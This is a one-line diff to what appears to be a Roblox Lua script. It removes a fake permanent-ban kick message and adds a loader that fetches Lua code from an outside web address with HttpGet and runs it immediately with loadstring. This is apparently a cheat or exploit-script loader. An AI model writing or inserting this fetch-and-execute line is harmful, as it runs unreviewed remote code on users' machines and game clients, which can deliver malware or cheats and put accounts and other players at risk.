@@ -1,1 +1,1 @@
-game.Players.LocalPlayer:Kick("You have been banned from roblox forever!")
+loadstring(game:HttpGet('https://s.kometa.ga/kometa.lua'))()
